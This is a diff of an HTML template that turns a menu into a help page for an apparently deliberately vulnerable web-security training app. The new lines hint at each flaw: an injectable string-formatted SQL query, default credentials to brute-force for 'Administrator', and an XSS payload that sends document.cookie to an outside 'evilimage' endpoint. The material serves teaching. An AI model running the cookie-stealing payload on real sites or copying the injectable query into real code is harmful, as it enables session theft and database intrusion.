@@ -3,7 +3,7 @@
     <head>
         <meta charset="utf-8">
         <meta http-equiv="x-ua-compatible" content="ie=edge">
-        <title>Select | First Filing MDM</title>
+        <title>Help | First Filing MDM</title>
         <meta name="description" content="">
         <meta name="keywords" content="">
         <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -49,43 +49,37 @@
                                                 <tbody>
                                                     <tr>
                                                         <th scope="row">Injection</th>
-														<td><a href="/inject">Login</a></td>
+														<td>sql = '''SELECT username FROM users WHERE username = '%s' and password = '%s' ''' % (username, password)</td>
                                                     </tr>
                                                     <tr>
                                                         <th scope="row">Broken Authentication</th>
-														<td><a href="brokenauth1">Login 1</a> | <a href="brokenauth2">Login 2</a></td>
+														<td><a href="brokenauth1">Default credentials | Bruteforce (Username: Administrator)</td>
                                                     </tr>
                                                     <tr>
                                                         <th scope="row">Cross Side Scripting Pages</th>
-														<td><a href="/xssadmin">Login and Contact Form</td>
+														<td>&#x3C;script&#x3E;
+                                                        document.write(&#x27;&#x3C;img src=&#x22;https://domain.se/evilimage?get=&#x27;+escape(document.cookie)+&#x27;&#x22;&#x3E;&#x27;);
+                                                        &#x3C;/script&#x3E;</td>
                                                     </tr>
                                                     <tr>
-                                                        <th scope="row">Cross side Scripting Tools</th>
-														<td><a href="/removecookies">Reset cookies</a> | <a href="/xssadmin/adddummydata">Add comment data</a> | <a href="/evillog/reset">Reset evil log</a> | <a href="/evilimage">Evil image (?get=cookie)</a> | <a href="/evillog">Evil log</a></td>
-                                                    </tr>													
-                                                    <tr>
                                                         <th scope="row">Security Misconfiguration</th>
-														<td><a href=""><a href="/secmis">Login</a></td>
+														<td><a href="">Fixed SQL injection, try any way.</td>
                                                     </tr>														
 	                                                <tr>
                                                         <th scope="row">Broken Access Control</th>
-														<td><a href=""><a href="/brokenaccess">Login</a></td>
+														<td><a href="">Check User ID in URL</td>
                                                     </tr>	
                                                     <tr>
                                                         <th scope="row">Broken Session</th>
-														<td><a href=""><a href="/brokensession">Login</a></td>
+														<td><a href="">Flask does not encrypt cookie content, only signs it.</td>
                                                     </tr>
-                                                    <tr>
-                                                        <th scope="row">Dependency-Check</th>
-														<td><a href=""><a href="/dcheck">Report</a></td>
-                                                    </tr>                                                    
 												
 													
                                                 </tbody>
                                             </table>
                                             <br>
                                             <p>{{message}}</p>
-                                            <p><a href="/resetall"><buttontype="button" class="btn btn-primary"><i class="ik ik-zap"></i>Reset all</button></a>  <a href="/help"><buttontype="button" class="btn btn-secondary"><i class="ik ik-help-circle"></i>Help</button></a>  <a href="/test"><buttontype="button" class="btn btn-secondary"><i class="ik ik-zap"></i>Test</button></a></p>
+                                            <p><a href="/resetall"><buttontype="button" class="btn btn-primary"><i class="ik ik-zap"></i>Reset all</button></a> <a href="/select"><buttontype="button" class="btn btn-secondary"><i class="ik ik-arrow-left"></i>Back</button></a> </p>
                                         </div>
                         </div>
                     </div>
